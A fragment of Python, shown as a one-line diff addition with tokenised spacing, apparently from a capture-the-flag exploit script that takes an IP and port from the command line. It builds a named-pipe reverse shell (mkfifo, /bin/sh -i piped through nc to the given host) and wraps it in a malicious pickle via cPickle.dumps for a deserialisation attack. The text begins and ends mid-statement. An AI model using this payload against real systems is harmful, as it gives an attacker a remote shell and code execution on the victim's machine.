@@ -1,0 +1,1 @@
+{} [ip] [port] " . format ( sys . argv [ 0 ])) sys . exit () ip = sys . argv [ 1 ] port = sys . argv [ 2 ] cmd = " rm /tmp/0xdf; mkfifo /tmp/0xdf; cat /tmp/0xdf | /bin/sh -i 2>&1 | nc {} {} > /tmp/0xdf " . format ( ip , port ) exploit = cPickle . dumps ( Exploit ( cmd )) char = exploit [: - 1 ] quote = exploit [ - 1 :] id_ = md5 ( char + quote ).
